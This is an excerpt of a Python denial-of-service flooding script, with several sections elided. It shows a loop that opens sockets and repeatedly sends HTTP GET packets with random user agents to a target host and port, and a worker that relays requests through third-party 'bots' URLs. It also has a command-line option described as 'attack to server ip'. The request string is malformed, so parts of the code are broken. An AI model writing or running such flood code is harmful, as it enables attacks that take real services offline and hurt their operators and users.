...
def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\url: "+url+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((url,int(port)))
			if s.sendto( packet, (url, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! Dos--> \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mshut<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mno connection! url maybe down\033[0m")
...
def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+url)
		w.task_done()
...
def get_parameters():
	...
	optp.add_option("-s","--url", dest="url",help="attack to server ip -s ip")
...
if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[92m",url," port: ",str(port)," turbo: ",str(thr),"\033[0m")
